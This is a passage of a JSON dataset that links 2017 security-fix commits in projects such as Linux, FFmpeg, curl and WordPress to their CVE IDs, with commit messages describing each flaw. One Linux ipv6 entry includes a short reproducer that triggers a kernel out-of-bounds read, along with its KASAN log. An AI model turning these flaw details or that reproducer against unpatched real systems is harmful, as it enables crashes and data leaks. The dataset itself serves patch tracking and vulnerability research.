  "bbc353c05ab8ab7baef1fc60f2fb54ee58f4dfb69917cb6502ee3be7c5f83559": {
    "url": "https://github.com/TigerVNC/tigervnc/pull/436/commits/bf3bdac082978ca32895a4b6a123016094905689",
    "title": "Fix crash from integer overflow in SMsgReader::readClientCutText",
    "body": "The length sent by client is U32, but is converted into int. If it was bigger than 0x7fffffff the resulting int is negative, it passes the check against maxCutText and later throws std::bad_alloc from CharArray which takes down the whole server.All the Streaming API deals with lengths in ints, so we can't tell it to skip that big amount of data. And it is not realistic to expect more than 2GB of clipboard data anyway. So lets just throw rdr::Exception that will disconnect this client and keep the server alive.",
    "cveIds": [
      "CVE-2017-7395"
    ],
    "cveIdsCount": 1
  },
  "d3aec3b8705df0c0d6ce84723e78016e420316bd3b3fe4bf59dafc67d2d5a2b5": {
    "url": "https://github.com/curl/curl/commit/1890d59905414ab84a35892b2e45833654aa5c13",
    "title": "tool_writeout: fixed a buffer read overrun on --write-out",
    "body": "If a % ended the statement, the string's trailing NUL would be skippedand memory past the end of the buffer would be accessed and potentiallydisplayed as part of the --write-out output. Added tests 1440 and 1441to check for this kind of condition.Reported-by: Brian Carpenter",
    "cveIds": [
      "CVE-2017-7407"
    ],
    "cveIdsCount": 1
  },
  "ffc59d75debec97cf5d8c29ced92c3b563495daf65cb72858e08981057d85cc3": {
    "url": "https://github.com/ansible/ansible/commit/ed56f51f185a1ffd7ea57130d260098686fcc7c2",
    "title": "Fixing security issue with lookup returns not tainting the jinja2 env…",
    "body": "…ironmentCVE-2017-7481Lookup returns wrap the result in unsafe, however when used through thestandard templar engine, this does not result in the jinja2 environment beingmarked as unsafe as a whole. This means the lookup result looses the unsafeprotection and may become simple unicode strings, which can result in badthings being re-templated.This also adds a global lookup param and cfg options for lookups to allowunsafe returns, so users can force the previous (insecure) behavior.",
    "cveIds": [
      "CVE-2017-7481"
    ],
    "cveIdsCount": 1
  },
  "3dab7663ebf6507dfbbddd776124018880c78f6dc7656abb79fe6cd836167e44": {
    "url": "https://github.com/torvalds/linux/commit/ee0d8d8482345ff97a75a7d747efc309f13b0d80",
    "title": "ipx: call ipxitf_put() in ioctl error path",
    "body": "We should call ipxitf_put() if the copy_to_user() fails.Reported-by: 李强 <liqiang6-s@360.cn>Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2017-7487"
    ],
    "cveIdsCount": 1
  },
  "c27ab6db13b8e7405a12305eb50289dd770e8320692f5efca3d66323c472ea1c": {
    "url": "https://github.com/torvalds/linux/commit/06bd3c36a733ac27962fea7d6f47168841376824",
    "title": "ext4: fix data exposure after a crash",
    "body": "Huang has reported that in his powerfail testing he is seeing staleblock contents in some of recently allocated blocks although he mountsext4 in data=ordered mode. After some investigation I have found outthat indeed when delayed allocation is used, we don't add inode totransaction's list of inodes needing flushing before commit. Originallywe were doing that but commit f3b5929 removed the logic with aflawed argument that it is not needed.The problem is that although for delayed allocated blocks we write theircontents immediately after allocating them, there is no guarantee thatthe IO scheduler or device doesn't reorder things and thus transactionallocating blocks and attaching them to inode can reach stable storagebefore actual block contents. Actually whenever we attach freshlyallocated blocks to inode using a written extent, we should add inode totransaction's ordered inode list to make sure we properly wait for blockcontents to be written before committing the transaction. So that iswhat we do in this patch. This also handles other cases where stale dataexposure was possible - like filling hole via mmap indata=ordered,nodelalloc mode.The only exception to the above rule are extending direct IO writes whereblkdev_direct_IO() waits for IO to complete before increasing i_size andthus stale data exposure is not possible. For now we don't complicatethe code with optimizing this special case since the overhead is prettylow. In case this is observed to be a performance problem we can alwayshandle it using a special flag to ext4_map_blocks().CC: stable@vger.kernel.orgFixes: f3b5929Reported-by: \"HUANG Weller (CM/ESW12-CN)\" <Weller.Huang@cn.bosch.com>Tested-by: \"HUANG Weller (CM/ESW12-CN)\" <Weller.Huang@cn.bosch.com>Signed-off-by: Jan Kara <jack@suse.cz>Signed-off-by: Theodore Ts'o <tytso@mit.edu>",
    "cveIds": [
      "CVE-2017-7495"
    ],
    "cveIdsCount": 1
  },
  "3120f3aa03fe21f49475cb1961624f508d5081de04080530ca68cfaf1df807ce": {
    "url": "https://github.com/qemu/qemu/commit/30663fd26c0307e414622c7a8607fbc04f92ec14",
    "title": "tcg/i386: Check the size of instruction being translated",
    "body": "This fixes the bug: 'user-to-root privesc inside VM via bad translationcaching' reported by Jann Horn here:https://bugs.chromium.org/p/project-zero/issues/detail?id=1122Reviewed-by: Richard Henderson <rth@twiddle.net>CC: Peter Maydell <peter.maydell@linaro.org>CC: Paolo Bonzini <pbonzini@redhat.com>Reported-by: Jann Horn <jannh@google.com>Signed-off-by: Pranith Kumar <bobby.prani@gmail.com>Message-Id: <20170323175851.14342-1-bobby.prani@gmail.com>Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>",
    "cveIds": [
      "CVE-2017-8284"
    ],
    "cveIdsCount": 1
  },
  "f458caeeea3e7252119c77032a1f384ad162beda129291df6e9600a74a7fdcc6": {
    "url": "https://github.com/GNOME/gnome-shell/commit/ff425d1db7082e2755d2a405af53861552acf2a1",
    "title": "extensionSystem: handle reloading broken extensions",
    "body": "Some extensions out there may fail to reload. When that happens,we need to catch any exceptions so that we don't leave things ina broken state that could lead to leaving extensions enabled inthe screen shield.https://bugzilla.gnome.org/show_bug.cgi?id=781728",
    "cveIds": [
      "CVE-2017-8288"
    ],
    "cveIdsCount": 1
  },
  "db127978ab9631e0cb7076352597efaf80701f4908d3ea60a11175415935bd51": {
    "url": "https://github.com/VirusTotal/yara/commit/83d799804648c2a0895d40a19835d9b757c6fa4e",
    "title": "Fix issue #646 (#648)",
    "body": "* Fix issue #646 and some edge cases with wide regexps using \\b and \\B* Rename function IS_WORD_CHAR to _yr_re_is_word_char",
    "cveIds": [
      "CVE-2017-8294"
    ],
    "cveIdsCount": 1
  },
  "344ad95986f37b3a8c1d167e6b26f0d805fa80f25f4063adc5cc3f7242793886": {
    "url": "https://github.com/jsummers/imageworsener/commit/86564051db45b466e5f667111ce00b5eeedc8fb6",
    "title": "Reduced the max memory use and image size in 64-bit builds",
    "body": "This is a stopgap measure that should prevent some problems with excessiveresource use, and possibly integer overflow.Related: issue #14",
    "cveIds": [
      "CVE-2017-8325"
    ],
    "cveIdsCount": 1
  },
  "ba719dcbeaec3a66cce663a1674461420a8b8a4d97125019af6be2e1e12eb390": {
    "url": "https://github.com/LibreOffice/core/commit/6e6e54f944a5ebb49e9110bdeff844d00a96c56c",
    "title": "ofz#889 readjust jpeg import",
    "body": "Change-Id: I4e25db429b8dee9265ab2ad468c21cc34a50df6cReviewed-on: https://gerrit.libreoffice.org/35325Tested-by: Jenkins <ci@libreoffice.org>Reviewed-by: Caolán McNamara <caolanm@redhat.com>Tested-by: Caolán McNamara <caolanm@redhat.com>",
    "cveIds": [
      "CVE-2017-8358"
    ],
    "cveIdsCount": 1
  },
  "bb61d1f75d4fa827118e1a02761e55b45ded8a16252fd3ebbc8365dfb1bca820": {
    "url": "https://github.com/varnishcache/varnish-cache/commit/176f8a075a963ffbfa56f1c460c15f6a1a6af5a7",
    "title": "Avoid buffer read overflow on vcl_error and -sfile",
    "body": "The file stevedore may return a buffer larger than asked for whenrequesting storage. Due to lack of check for this condition, the codeto copy the synthetic error memory buffer from vcl_error would overrunthe buffer.Patch by @shamgerFixes: #2429",
    "cveIds": [
      "CVE-2017-8807"
    ],
    "cveIdsCount": 1
  },
  "266e1c95c0eb640ffcb711fbff26e465cfd4d3d627c34ef05ae48dc198ed0a21": {
    "url": "https://github.com/stoth68000/media-tree/commit/354dd3924a2e43806774953de536257548b5002c",
    "title": "[PATCH] saa7164: Bug - Double fetch PCIe access condition",
    "body": "Avoid a double fetch by reusing the values from the prior transfer.Originally reported via https://bugzilla.kernel.org/show_bug.cgi?id=195559Thanks to Pengfei Wang <wpengfeinudt@gmail.com> for reporting.Signed-off-by: Steven Toth <stoth@kernellabs.com>",
    "cveIds": [
      "CVE-2017-8831"
    ],
    "cveIdsCount": 1
  },
  "80a51b4cd4de06583263152a454416c27661c01eb78f66c2d5ff8e76f0fa8a51": {
    "url": "https://github.com/DeuxHuitHuit/symphony-2/commit/cd69a2a516e6503c1a1c7e097ee90d255ec3d6b7",
    "title": "Prevent XSS with section's name and nav group",
    "body": "This commit adds sanitization of the section's name and naviguationgroup, which permitted authenticated XSS.Reported by Pradeep Kumar <pradeepch99@gmail.com>cc @michael-e @brendo",
    "cveIds": [
      "CVE-2017-8876"
    ],
    "cveIdsCount": 1
  },
  "c828da87c36a59bc621faebdd2338324025242d0560f74d050ce7dd631b21820": {
    "url": "https://github.com/dgl/cgiirc/commit/46dd48442204207b52c16065ad67d294194afd8d",
    "title": "Validate R parameter in irc.cgi",
    "body": "This matches the check done in nph-irc.cgi.",
    "cveIds": [
      "CVE-2017-8920"
    ],
    "cveIdsCount": 1
  },
  "c902f21129cb5ec3c737e5c23b62112e639bf79955f728edaeaac715c3b7a8cc": {
    "url": "https://github.com/libav/libav/commit/fe6eea99efac66839052af547426518efd970b24",
    "title": "nsvdec: don't ignore the return value of av_get_packet()",
    "body": "Fixes invalid reads with corrupted files.CC: libav-stable@libav.orgBug-Id: 1039",
    "cveIds": [
      "CVE-2017-9051"
    ],
    "cveIdsCount": 1
  },
  "8af9f5baf6f88c1d1f3bc1ac85cfba29bfea477920e41d8badc89e2e2376ce43": {
    "url": "https://github.com/WordPress/WordPress/commit/8c7ea71edbbffca5d9766b7bea7c7f3722ffafa6",
    "title": "Media: Simplify upload error message construction.",
    "body": "Built from https://develop.svn.wordpress.org/trunk@40736git-svn-id: http://core.svn.wordpress.org/trunk@40594 1a063a9b-81f0-0310-95a4-ce76da25c4cd",
    "cveIds": [
      "CVE-2017-9061"
    ],
    "cveIdsCount": 1
  },
  "138067c37aca18134a9edf87ad1cbe88dba58256cb5333c230e6ee2d7f23610c": {
    "url": "https://github.com/WordPress/WordPress/commit/3d95e3ae816f4d7c638f40d3e936a4be19724381",
    "title": "Adjust post meta checks",
    "body": "Built from https://develop.svn.wordpress.org/trunk@40692git-svn-id: http://core.svn.wordpress.org/trunk@40555 1a063a9b-81f0-0310-95a4-ce76da25c4cd",
    "cveIds": [
      "CVE-2017-9062"
    ],
    "cveIdsCount": 1
  },
  "b2b3c8456f089113dc79ee282524d3b8747cdf53ba20f13ec94adf8d7d8ab656": {
    "url": "https://github.com/WordPress/WordPress/commit/3d10fef22d788f29aed745b0f5ff6f6baea69af3",
    "title": "Customize: Igore invalid customization sessions.",
    "body": "Built from https://develop.svn.wordpress.org/trunk@40704git-svn-id: http://core.svn.wordpress.org/trunk@40567 1a063a9b-81f0-0310-95a4-ce76da25c4cd",
    "cveIds": [
      "CVE-2017-9063"
    ],
    "cveIdsCount": 1
  },
  "1eae1eb49ef9d68fb8b77819024d57a3e1347310c8906e76d675e3a12cde8f0e": {
    "url": "https://github.com/WordPress/WordPress/commit/38347d7c580be4cdd8476e4bbc653d5c79ed9b67",
    "title": "Add nonce for updating file system credentials.",
    "body": "Built from https://develop.svn.wordpress.org/trunk@40723git-svn-id: http://core.svn.wordpress.org/trunk@40581 1a063a9b-81f0-0310-95a4-ce76da25c4cd",
    "cveIds": [
      "CVE-2017-9064"
    ],
    "cveIdsCount": 1
  },
  "513d9ebfea8263d9ce68c005b6746683dc1e19f718d890b34a38004349e1a3f8": {
    "url": "https://github.com/WordPress/WordPress/commit/e88a48a066ab2200ce3091b131d43e2fab2460a4",
    "title": "Whitelist post arguments in XML-RPC",
    "body": "Built from https://develop.svn.wordpress.org/trunk@40677git-svn-id: http://core.svn.wordpress.org/trunk@40540 1a063a9b-81f0-0310-95a4-ce76da25c4cd",
    "cveIds": [
      "CVE-2017-9065"
    ],
    "cveIdsCount": 1
  },
  "4c2c5f26b31047d8f23de145bec51703641b16e2efb5464bbc9fa5120ccb6f83": {
    "url": "https://github.com/torvalds/linux/commit/2423496af35d94a87156b063ea5cedffc10a70a1",
    "title": "ipv6: Prevent overrun when parsing v6 header options",
    "body": "The KASAN warning repoted below was discovered with a syzkallerprogram. The reproducer is basically: int s = socket(AF_INET6, SOCK_RAW, NEXTHDR_HOP); send(s, &one_byte_of_data, 1, MSG_MORE); send(s, &more_than_mtu_bytes_data, 2000, 0);The socket() call sets the nexthdr field of the v6 header toNEXTHDR_HOP, the first send call primes the payload with a non zerobyte of data, and the second send call triggers the fragmentation path.The fragmentation code tries to parse the header options in orderto figure out where to insert the fragment option. Since nexthdr pointsto an invalid option, the calculation of the size of the network headercan made to be much larger than the linear section of the skb and datais read outside of it.This fix makes ip6_find_1stfrag return an error if it detectsrunning out-of-bounds.[ 42.361487] ==================================================================[ 42.364412] BUG: KASAN: slab-out-of-bounds in ip6_fragment+0x11c8/0x3730[ 42.365471] Read of size 840 at addr ffff88000969e798 by task ip6_fragment-oo/3789[ 42.366469][ 42.366696] CPU: 1 PID: 3789 Comm: ip6_fragment-oo Not tainted 4.11.0+ #41[ 42.367628] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.1-1ubuntu1 04/01/2014[ 42.368824] Call Trace:[ 42.369183] dump_stack+0xb3/0x10b[ 42.369664] print_address_description+0x73/0x290[ 42.370325] kasan_report+0x252/0x370[ 42.370839] ? ip6_fragment+0x11c8/0x3730[ 42.371396] check_memory_region+0x13c/0x1a0[ 42.371978] memcpy+0x23/0x50[ 42.372395] ip6_fragment+0x11c8/0x3730[ 42.372920] ? nf_ct_expect_unregister_notifier+0x110/0x110[ 42.373681] ? ip6_copy_metadata+0x7f0/0x7f0[ 42.374263] ? ip6_forward+0x2e30/0x2e30[ 42.374803] ip6_finish_output+0x584/0x990[ 42.375350] ip6_output+0x1b7/0x690[ 42.375836] ? ip6_finish_output+0x990/0x990[ 42.376411] ? ip6_fragment+0x3730/0x3730[ 42.376968] ip6_local_out+0x95/0x160[ 42.377471] ip6_send_skb+0xa1/0x330[ 42.377969] ip6_push_pending_frames+0xb3/0xe0[ 42.378589] rawv6_sendmsg+0x2051/0x2db0[ 42.379129] ? rawv6_bind+0x8b0/0x8b0[ 42.379633] ? _copy_from_user+0x84/0xe0[ 42.380193] ? debug_check_no_locks_freed+0x290/0x290[ 42.380878] ? ___sys_sendmsg+0x162/0x930[ 42.381427] ? rcu_read_lock_sched_held+0xa3/0x120[ 42.382074] ? sock_has_perm+0x1f6/0x290[ 42.382614] ? ___sys_sendmsg+0x167/0x930[ 42.383173] ? lock_downgrade+0x660/0x660[ 42.383727] inet_sendmsg+0x123/0x500[ 42.384226] ? inet_sendmsg+0x123/0x500[ 42.384748] ? inet_recvmsg+0x540/0x540[ 42.385263] sock_sendmsg+0xca/0x110[ 42.385758] SYSC_sendto+0x217/0x380[ 42.386249] ? SYSC_connect+0x310/0x310[ 42.386783] ? __might_fault+0x110/0x1d0[ 42.387324] ? lock_downgrade+0x660/0x660[ 42.387880] ? __fget_light+0xa1/0x1f0[ 42.388403] ? __fdget+0x18/0x20[ 42.388851] ? sock_common_setsockopt+0x95/0xd0[ 42.389472] ? SyS_setsockopt+0x17f/0x260[ 42.390021] ? entry_SYSCALL_64_fastpath+0x5/0xbe[ 42.390650] SyS_sendto+0x40/0x50[ 42.391103] entry_SYSCALL_64_fastpath+0x1f/0xbe[ 42.391731] RIP: 0033:0x7fbbb711e383[ 42.392217] RSP: 002b:00007ffff4d34f28 EFLAGS: 00000246 ORIG_RAX: 000000000000002c[ 42.393235] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007fbbb711e383[ 42.394195] RDX: 0000000000001000 RSI: 00007ffff4d34f60 RDI: 0000000000000003[ 42.395145] RBP: 0000000000000046 R08: 00007ffff4d34f40 R09: 0000000000000018[ 42.396056] R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000400aad[ 42.396598] R13: 0000000000000066 R14: 00007ffff4d34ee0 R15: 00007fbbb717af00[ 42.397257][ 42.397411] Allocated by task 3789:[ 42.397702] save_stack_trace+0x16/0x20[ 42.398005] save_stack+0x46/0xd0[ 42.398267] kasan_kmalloc+0xad/0xe0[ 42.398548] kasan_slab_alloc+0x12/0x20[ 42.398848] __kmalloc_node_track_caller+0xcb/0x380[ 42.399224] __kmalloc_reserve.isra.32+0x41/0xe0[ 42.399654] __alloc_skb+0xf8/0x580[ 42.400003] sock_wmalloc+0xab/0xf0[ 42.400346] __ip6_append_data.isra.41+0x2472/0x33d0[ 42.400813] ip6_append_data+0x1a8/0x2f0[ 42.401122] rawv6_sendmsg+0x11ee/0x2db0[ 42.401505] inet_sendmsg+0x123/0x500[ 42.401860] sock_sendmsg+0xca/0x110[ 42.402209] ___sys_sendmsg+0x7cb/0x930[ 42.402582] __sys_sendmsg+0xd9/0x190[ 42.402941] SyS_sendmsg+0x2d/0x50[ 42.403273] entry_SYSCALL_64_fastpath+0x1f/0xbe[ 42.403718][ 42.403871] Freed by task 1794:[ 42.404146] save_stack_trace+0x16/0x20[ 42.404515] save_stack+0x46/0xd0[ 42.404827] kasan_slab_free+0x72/0xc0[ 42.405167] kfree+0xe8/0x2b0[ 42.405462] skb_free_head+0x74/0xb0[ 42.405806] skb_release_data+0x30e/0x3a0[ 42.406198] skb_release_all+0x4a/0x60[ 42.406563] consume_skb+0x113/0x2e0[ 42.406910] skb_free_datagram+0x1a/0xe0[ 42.407288] netlink_recvmsg+0x60d/0xe40[ 42.407667] sock_recvmsg+0xd7/0x110[ 42.408022] ___sys_recvmsg+0x25c/0x580[ 42.408395] __sys_recvmsg+0xd6/0x190[ 42.408753] SyS_recvmsg+0x2d/0x50[ 42.409086] entry_SYSCALL_64_fastpath+0x1f/0xbe[ 42.409513][ 42.409665] The buggy address belongs to the object at ffff88000969e780[ 42.409665] which belongs to the cache kmalloc-512 of size 512[ 42.410846] The buggy address is located 24 bytes inside of[ 42.410846] 512-byte region [ffff88000969e780, ffff88000969e980)[ 42.411941] The buggy address belongs to the page:[ 42.412405] page:ffffea000025a780 count:1 mapcount:0 mapping: (null) index:0x0 compound_mapcount: 0[ 42.413298] flags: 0x100000000008100(slab|head)[ 42.413729] raw: 0100000000008100 0000000000000000 0000000000000000 00000001800c000c[ 42.414387] raw: ffffea00002a9500 0000000900000007 ffff88000c401280 0000000000000000[ 42.415074] page dumped because: kasan: bad access detected[ 42.415604][ 42.415757] Memory state around the buggy address:[ 42.416222] ffff88000969e880: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00[ 42.416904] ffff88000969e900: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00[ 42.417591] >ffff88000969e980: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc[ 42.418273] ^[ 42.418588] ffff88000969ea00: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb[ 42.419273] ffff88000969ea80: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb[ 42.419882] ==================================================================Reported-by: Andrey Konovalov <andreyknvl@google.com>Signed-off-by: Craig Gallek <kraig@google.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2017-9074"
    ],
    "cveIdsCount": 1
  },
  "c64629ae126fa0f99b5a72beedaf954b93b1fa996e698c1e385af50ec65e5193": {
    "url": "https://github.com/torvalds/linux/commit/0d0e57697f162da4aa218b5feafe614fb666db07",
    "title": "bpf: don't let ldimm64 leak map addresses on unprivileged",
    "body": "The patch fixes two things at once:1) It checks the env->allow_ptr_leaks and only prints the map address to the log if we have the privileges to do so, otherwise it just dumps 0 as we would when kptr_restrict is enabled on %pK. Given the latter is off by default and not every distro sets it, I don't want to rely on this, hence the 0 by default for unprivileged.2) Printing of ldimm64 in the verifier log is currently broken in that we don't print the full immediate, but only the 32 bit part of the first insn part for ldimm64. Thus, fix this up as well; it's okay to access, since we verified all ldimm64 earlier already (including just constants) through replace_map_fd_with_map_ptr().Fixes: 1be7f75 (\"bpf: enable non-root eBPF programs\")Fixes: cbd3570 (\"bpf: verifier (add ability to receive verification log)\")Reported-by: Jann Horn <jannh@google.com>Signed-off-by: Daniel Borkmann <daniel@iogearbox.net>Acked-by: Alexei Starovoitov <ast@kernel.org>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2017-9150"
    ],
    "cveIdsCount": 1
  },
  "4ae497db6cddedebfec0f875e09e1d88fb35dc755bb3a6b95843ec0e293f99da": {
    "url": "https://github.com/jsummers/imageworsener/commit/a4f247707f08e322f0b41e82c3e06e224240a654",
    "title": "Fixed a bug that could cause invalid memory to be accessed",
    "body": "The bug could happen when transparency is removed from an image.Also fixed a semi-related BMP error handling logic bug.Fixes issue #21",
    "cveIds": [
      "CVE-2017-9203"
    ],
    "cveIdsCount": 1
  },
  "12502146c96c1409e47dda16b77f6e0ed8d3a64b4729d31289b17638875babf4": {
    "url": "https://github.com/jsummers/imageworsener/commit/b45cb1b665a14b0175b9cb1502ef7168e1fe0d5d",
    "title": "Fixed invalid memory access bugs when decoding JPEG Exif data",
    "body": "Fixes issues #22, #23, #24, #25",
    "cveIds": [
      "CVE-2017-9204",
      "CVE-2017-9205",
      "CVE-2017-9206",
      "CVE-2017-9207"
    ],
    "cveIdsCount": 4
  },
  "195e3a2cb8b800f65f57075724137147a66e4fc614d700bff5d9554fa0db69f0": {
    "url": "https://github.com/torvalds/linux/commit/9933e113c2e87a9f46a40fde8dafbf801dca1ab9",
    "title": "crypto: skcipher - Add missing API setkey checks",
    "body": "The API setkey checks for key sizes and alignment went AWOL during theskcipher conversion. This patch restores them.Cc: <stable@vger.kernel.org>Fixes: 4e6c3df (\"crypto: skcipher - Add low-level skcipher...\")Reported-by: Baozeng <sploving1@gmail.com>Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>",
    "cveIds": [
      "CVE-2017-9211"
    ],
    "cveIdsCount": 1
  },
  "46b9cfe61d5f4d73b2967b5d1213b8422ce4cf166c4919c3be2f0b895ef92f7b": {
    "url": "https://github.com/systemd/systemd/commit/a924f43f30f9c4acaf70618dd2a055f8b0f166be",
    "title": "resolved: bugfix of null pointer p->question dereferencing (#6020)",
    "body": "See https://bugs.launchpad.net/ubuntu/+source/systemd/+bug/1621396",
    "cveIds": [
      "CVE-2017-9217"
    ],
    "cveIdsCount": 1
  },
  "abc229c488cb452247bdf21bc272602819f1ff04d497572a9bce9235c382e232": {
    "url": "https://github.com/kkos/oniguruma/commit/b4bf968ad52afe14e60a2dc8a95d3555c543353a",
    "title": "fix #55 : check too big code point value for single byte value in nex…",
    "body": "…t_state_val()",
    "cveIds": [
      "CVE-2017-9226"
    ],
    "cveIdsCount": 1
  },
  "d2a3c5d6c6ab5e44e67f9c36c26f31cfa50aac067f0cf2a44bf68d97c77dd84f": {
    "url": "https://github.com/apache/httpd/commit/4cc27823899e070268b906ca677ee838d07cf67a",
    "title": "core: Disallow Methods' registration at run time (.htaccess), they ma…",
    "body": "…y beused only if registered at init time (httpd.conf).Calling ap_method_register() in children processes is not the right scopesince it won't be shared for all requests.git-svn-id: https://svn.apache.org/repos/asf/httpd/httpd/trunk@1807655 13f79535-47bb-0310-9956-ffa450edef68",
    "cveIds": [
      "CVE-2017-9798"
    ],
    "cveIdsCount": 1
  },
  "cb6d67107034552c3711f7a236687242a950480dde8dcfd9dc3fca1b9048a8f9": {
    "url": "https://github.com/torvalds/linux/commit/20e2b791796bd68816fa115f12be5320de2b8021",
    "title": "ALSA: msnd: Optimize / harden DSP and MIDI loops",
    "body": "The ISA msnd drivers have loops fetching the ring-buffer head, tailand size values inside the loops. Such codes are inefficient andfragile.This patch optimizes it, and also adds the sanity check to avoid theendless loops.Bugzilla: https://bugzilla.kernel.org/show_bug.cgi?id=196131Bugzilla: https://bugzilla.kernel.org/show_bug.cgi?id=196133Signed-off-by: Takashi Iwai <tiwai@suse.de>",
    "cveIds": [
      "CVE-2017-9984",
      "CVE-2017-9985"
    ],
    "cveIdsCount": 2
  },
  "adc8d59c1eb43c7366cf75a83548f8c74764210e668fc5d3758522c13183624b": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/cb243972b121b1ae6b60a78ff55a0506c69f3879",
    "title": "avcodec/xpmdec: Fix multiple pointer/memory issues",
    "body": "Most of these were found through code review in response tofixing 1466/clusterfuzz-testcase-minimized-5961584419536896There is thus no testcase for most of this.The initial issue was Found-by: continuous fuzzing process https://github.com/google/oss-fuzz/tree/master/targets/ffmpegSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2017-9990"
    ],
    "cveIdsCount": 1
  },
  "c3dcec5b1a6f3b39f85e3fbc8c05feb2993be3e7d267dcc7f41de4d5f2520ce3": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/441026fcb13ac23aa10edc312bdacb6445a0ad06",
    "title": "avcodec/xwddec: Check bpp more completely",
    "body": "Fixes out of array accessFixes: 1399/clusterfuzz-testcase-minimized-4866094172995584Found-by: continuous fuzzing process https://github.com/google/oss-fuzz/tree/master/targets/ffmpegSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2017-9991"
    ],
    "cveIdsCount": 1
  },
  "f8908ae08684c2bcd91e193ecaa2f35438885253ba2aa3bdf3d52d6badccf611": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/f52fbf4f3ed02a7d872d8a102006f29b4421f360",
    "title": "avcodec/dfa: Fix off by 1 error",
    "body": "Fixes out of array accessFixes: 1345/clusterfuzz-testcase-minimized-6062963045695488Found-by: continuous fuzzing process https://github.com/google/oss-fuzz/tree/master/targets/ffmpegSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2017-9992"
    ],
    "cveIdsCount": 1
  },
  "66f3d24ad3096a6b57e0091a3ef1d375ba619e7da560635d0ab8a73775fb7d1f": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/a5d849b149ca67ced2d271dc84db0bc95a548abb",
    "title": "avformat/avidec: Limit formats in gab2 to srt and ass/ssa",
    "body": "This prevents part of one exploit leading to an information leakFound-by: Emil Lerner and Pavel CheremushkinReported-by: Thierry Foucu <tfoucu@google.com>Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2017-9993"
    ],
    "cveIdsCount": 1
  },
  "ac18aab1d730b56027b34293e157811a0c3ea4760b7583086be1c94c5d3cd717": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/189ff4219644532bdfa7bab28dfedaee4d6d4021",
    "title": "avformat/hls: Check local file extensions",
    "body": "This reduces the attack surface of local file-systeminformation leaking.It prevents the existing exploit leading to an information leak. Aswell as similar hypothetical attacks.Leaks of information from files and symlinks ending in common multimedia extensionsare still possible. But files with sensitive information like private keys and passwordsgenerally do not use common multimedia filename extensions.It does not stop leaks via remote addresses in the LAN.The existing exploit depends on a specific decoder as well.It does appear though that the exploit should be possible with any decoder.The problem is that as long as sensitive information gets into the decoder,the output of the decoder becomes sensitive as well.The only obvious solution is to prevent access to sensitive information. Or todisable hls or possibly some of its feature. More complex solutions likechecking the path to limit access to only subdirectories of the hls path maywork as an alternative. But such solutions are fragile and tricky to implementportably and would not stop every possible attack nor would they work with allvalid hls files.Developers have expressed their dislike / objected to disabling hls by default as wellas disabling hls with local files. There also where objections against restrictingremote url file extensions. This here is a less robust but also lowerinconvenience solution.It can be applied stand alone or together with other solutions.limiting the check to local files was suggested by nevcairielThis recommits the security fix without the author name joke which wasoriginally requested by Nicolas.Found-by: Emil Lerner and Pavel CheremushkinReported-by: Thierry Foucu <tfoucu@google.com>Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2017-9993"
    ],
    "cveIdsCount": 1
  },
  "9988c0c8bfe5432d729ec3b17e257daabc8f13f26159ad1d303acfaa07611044": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/6b5d3fb26fb4be48e4966e4b1d97c2165538d4ef",
    "title": "avcodec/webp: Always set pix_fmt",
    "body": "Fixes: out of array accessFixes: 1434/clusterfuzz-testcase-minimized-6314998085189632Fixes: 1435/clusterfuzz-testcase-minimized-6483783723253760Found-by: continuous fuzzing process https://github.com/google/oss-fuzz/tree/master/targets/ffmpegReviewed-by: \"Ronald S. Bultje\" <rsbultje@gmail.com>Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2017-9994"
    ],
    "cveIdsCount": 1
  },
  "8c3464c739b9102cc2085784f5d6c782c4fde46619ff49ee8f07ea835ff91c34": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/7ac5067146613997bb38442cb022d7f41321a706",
    "title": "avcodec/scpr: Check y in first line loop in decompress_i()",
    "body": "Fixes: out of array accessFixes: 1478/clusterfuzz-testcase-minimized-5285486908145664Found-by: continuous fuzzing process https://github.com/google/oss-fuzz/tree/master/targets/ffmpegSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2017-9995"
    ],
    "cveIdsCount": 1
  },
  "eb25092842b452613465e66559f58d4a12fedf21d72c5e194e37777ae3281992": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/2171dfae8c065878a2e130390eb78cf2947a5b69",
    "title": "avcodec/scpr: Fix multiple runtime error: index 256 out of bounds for…",
    "body": "… type 'unsigned int [256]'Fixes: 1519/clusterfuzz-testcase-minimized-5286680976162816Found-by: continuous fuzzing process https://github.com/google/oss-fuzz/tree/master/targets/ffmpegSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2017-9995"
    ],
    "cveIdsCount": 1
  },
  "1a05a1f53fe4b27636bbb5df17937e1e1f4993519259d0be35a9dcd9e4517945": {
